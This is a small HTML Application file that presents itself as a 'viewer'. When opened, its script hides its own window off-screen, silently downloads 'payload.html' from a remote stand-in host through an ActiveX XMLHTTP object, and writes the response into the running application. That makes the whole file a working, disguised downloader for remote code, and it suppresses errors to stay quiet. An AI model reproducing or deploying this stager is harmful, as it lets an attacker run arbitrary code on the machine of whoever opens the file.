<html>
<head>
<HTA:APPLICATION ID="viewer" APPLICATIONNAME="viewer" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="normal" />
<script language="JScript">
    window.resizeTo(1,1);
    window.moveTo(-2000,-2000);
    var target = "https://example.invalid/payload.html";
    try {
        var client = new ActiveXObject("Msxml2.XMLHTTP.6.0");
        client.open("GET", target, false);
        client.send();
        if (client.status == 200) {
            document.write(client.responseText);
            document.close();
        }
    } catch (e) {}
</script>
</head>
<body></body>
</html>
